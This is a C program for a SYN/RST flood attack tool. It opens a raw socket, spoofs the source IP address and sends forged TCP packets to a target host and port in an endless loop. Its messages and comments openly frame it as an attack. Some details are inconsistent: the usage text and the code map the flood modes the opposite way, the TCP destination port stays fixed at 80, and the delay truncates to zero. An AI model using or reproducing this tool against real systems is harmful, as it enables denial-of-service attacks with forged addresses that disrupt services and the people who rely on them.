#include "syn_flood.h"

#define DEFAULT_SRC_IP "127.0.0.1"
#define DEFAULT_DST_IP "127.0.0.1"
#define DEFAULT_DST_PORT 80
#define TIME_OUT 0.2

static size_t count = 0;

int main (int argc, char* argv[])
{
  
     //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    char target_ip[32];
    int dst_port = 80;
    char attack_name[20]; 
    strcpy(target_ip, DEFAULT_DST_IP);
    strcpy(source_ip, DEFAULT_SRC_IP);
    int syn_bit = 0, rst_bit = 0;
    
    enum { SYN_MODE, RST_MODE } mode = SYN_MODE;
    size_t optind;
    for (optind = 1; optind < argc && argv[optind][0] == '-'; optind++) {
        switch (argv[optind][1]) {
        case 't': { // set dst ip address
            if (optind < argc-1) {
                strcpy(target_ip, argv[optind+1]);
                optind++;
                break;
            }
                goto ARGS_ERROR_LABEL;
        }
        case 's': {
            if (optind < argc-1) {
                strcpy(source_ip, argv[optind+1]);
                optind++;
                break;
            }
           
                goto ARGS_ERROR_LABEL;
            
        }
        case 'p': {
            if (optind < argc-1) {
                dst_port = atoi(argv[optind+1]);
                optind++;
                break;
            }
           
                goto ARGS_ERROR_LABEL;
            
        }
        case 'r':{ 
             if (optind <= argc-1) {
                int req_mode = atoi(argv[optind+1]);
                if(req_mode == 1 || req_mode == 0) {
                    mode = req_mode;
                }
                optind++;
                break;
            }
                goto ARGS_ERROR_LABEL;
        }
        default:
            ARGS_ERROR_LABEL:
            fprintf(stderr, "Usage: %s  -t [IP TARGET] -p [port] -r [FLOOD_MODE(syn/rst : 1/0)] \n", argv[0]);
            exit(EXIT_FAILURE);
        }   
    } 
    
    //Create a raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     
    if(s == -1)
    {
        //socket creation failed, may be because of non-root privileges
        perror("Failed to create socket");
        exit(1);
    }
    
    if(mode == 0) {
        syn_bit = 1;
        rst_bit = 0;
        strcpy(attack_name,"SYN_FLOOD");
    } 
    else {
        syn_bit = 0;
        rst_bit = 1;
        strcpy(attack_name, "RST_FLOOD");
    }
    printf("preparing attack to target: %s:%d from %s \n", target_ip, dst_port, source_ip);


    printf("ATTACK MODE: %s(%d)  \n", attack_name,mode );
    
 
    //zero out the packet buffer
    memset (datagram, 0, 4096);
     
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
     
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
     
    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
     
    //some address resolution
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr (target_ip);
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    //Ip checksum
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
     
    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (80); // TODO: add terminal argument
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;  //tcp header size
    tcph->fin=0;
    tcph->syn=syn_bit;
    tcph->rst=rst_bit;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;
     
    //Now the TCP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
     
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
     
    tcph->check = csum( (unsigned short*) pseudogram , psize);
     
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
     
     int k = 0; // batch counter
    //loop if you want to flood :)
    while (1)
    {
        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
        //Data send faild
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send. Length : %d, #: %zu \n" , iph->tot_len, count);
           
        }
        sleep(TIME_OUT);
        count++;
    }
     
    return 0;
}
 